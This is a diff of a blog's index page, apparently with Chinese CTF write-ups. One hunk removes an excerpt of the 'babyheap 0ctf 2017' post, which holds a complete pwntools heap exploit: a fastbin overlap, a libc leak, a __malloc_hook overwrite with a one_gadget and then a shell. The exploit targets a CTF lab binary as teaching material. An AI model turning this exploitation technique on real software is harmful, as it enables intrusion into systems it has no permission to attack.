@@ -79,27 +79,18 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://example.com/2021/09/21/babyheap-0ctf-2017-wp/" data-id="cktuacxqw0000h8vk0vs7hsm0" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://example.com/2021/09/21/babyheap-0ctf-2017-wp/" data-id="cktuaheis0000hovkbx7620sp" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
     <div class="entry-content">
       
         <p>先贴源码</p>
-<h1 id="1-源码"><a href="#1-源码" class="headerlink" title="1.源码"></a>1.源码</h1><p>from pwn import *<br>#context.log_level = “debug”<br>p = remote(‘node4.buuoj.cn’,26841)<br>#p = process(‘./babyheap_0ctf_2017’)<br>elf = ELF(‘./babyheap_0ctf_2017’)<br>one_gadget = 0x4526a<br>#libc = ELF(‘/lib/x86_64-linux-gnu/libc.so.6’, checksec=False)<br>libc = ELF(‘./libc-2.23-buu.so’)<br>def alloc(size):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b’1’)<br>    p.recvuntil(b”Size: “)<br>    p.sendline(str(size))<br>def fill(idx,content):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b’2’)<br>    p.recvuntil(b”Index: “)<br>    p.sendline(str(idx))<br>    p.recvuntil(b”Size: “)<br>    p.sendline(str(len(content)))<br>    p.recvuntil(b”Content: “)<br>    p.send(content)<br>def free(idx):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b’3’)<br>    p.recvuntil(b”Index: “)<br>    p.sendline(str(idx))<br>def dump(idx):<br>    p.recvuntil(b”Command: “)<br>    p.sendline(b”4”)<br>    p.recvuntil(b”Index: “)<br>    p.sendline(str(idx))<br>    p.recvline()<br>    return p.recvline()</p>
-<p>alloc(0x10)<br>alloc(0x10)<br>alloc(0x10)<br>alloc(0x10)<br>alloc(0x80)</p>
-<p>free(1)<br>free(2)</p>
-<p>#gdb.attach(p)<br>payload = p64(0)*3<br>payload += p64(0x21)<br>payload += p64(0)*3<br>payload += p64(0x21)<br>payload += p8(0x80)<br>fill(0,payload)<br>#gdb.attach(p)<br>payload = p64(0) * 3<br>payload += p64(0x21)<br>fill(3,payload)<br>alloc(0x10)<br>alloc(0x10)<br>payload = p64(0)*3<br>payload += p64(0x91)<br>fill(3,payload)<br>alloc(0x80)<br>free(4)<br>dump(2)<br>#libc_base = u64(p.recv(6).ljust(8, b”\x00”))-0x3c4b78<br>libc_base = u64(dump(2)[:8].strip().ljust(8, b”\x00”))-0x3c4b78<br>success(‘libc_base =’ +hex(libc_base))<br>alloc(0x60)<br>free(4)<br>payload = p64(libc_base+0x3c4aed)<br>fill(2,payload)<br>alloc(0x60)<br>alloc(0x60)#fakechunk<br>payload = p8(0)*3+p64(0)*2<br>payload += p64(libc_base+one_gadget)<br>fill(6,payload)<br>#gdb.attach(p)<br>alloc(0x255)</p>
-<p>p.interactive()</p>
-<p>直接复制粘贴的话，首先远程的话去buu下了他的libc放到同一个文件夹里肯定是能跑的，本地跑不了别找我。</p>
-<p>其次这一题的话要注意使用的libc版本，我是直接用16的ubuntu做的</p>
-<h1 id="2-思路"><a href="#2-思路" class="headerlink" title="2.思路"></a>2.思路</h1><p>说思路之前先说一下这篇wp不会讲到特别多的基础知识点，所以如果连chunk和bin的数据结构都不知道的萌新可以走了…</p>
-<p>建议你们百度一下ctfwiki至少先知道chunk和fastbin unsortedbin的数据结构再来学习这篇wp，pwn的学习之路个人认为要扎实，埋头刷题是很心浮气躁的行为。</p>
-<p>如果你学到堆题，却连chunk的数据结构都不清楚，这个时候应该回过头好好打个怪练个级再来了</p>
-<p>不过最近手上刚好有个图，发出来给大伙儿看看，chunk的话大概也就这样了</p>
-<p>首先是head</p>
-<p>![$({O5Y]{7J{I}Y<del>2}QU5Q_E]($({O5Y]{7J{I}Y</del>2}QU5Q_E.png)</p>
-
+        
+          <p class="article-more-link">
+            <a href="/2021/09/21/babyheap-0ctf-2017-wp/#more" class="more-link">More <span class="meta-nav">→</span></a>
+          </p>
+        
       
     </div><!-- .entry-content -->
 
@@ -135,7 +126,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://example.com/2021/09/21/test/" data-id="cktuacxr20003h8vkd57e2ixi" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://example.com/2021/09/21/test/" data-id="cktuaheiz0002hovk0zk684ki" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -177,7 +168,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://example.com/2021/07/12/pwn-buuctf-rip-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%AF%A6%E7%BB%86wp/" data-id="cktuacxr10002h8vk3m991wvv" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://example.com/2021/07/12/pwn-buuctf-rip-%E7%AE%80%E5%8D%95%E6%A0%88%E6%BA%A2%E5%87%BA-%E8%AF%A6%E7%BB%86wp/" data-id="cktuaheiy0001hovk4uej3q5o" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -224,7 +215,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://example.com/2021/07/09/hello-world/" data-id="cktuacxr00001h8vka9635x9k" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://example.com/2021/07/09/hello-world/" data-id="cktuahej00003hovkbcpb1ygt" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
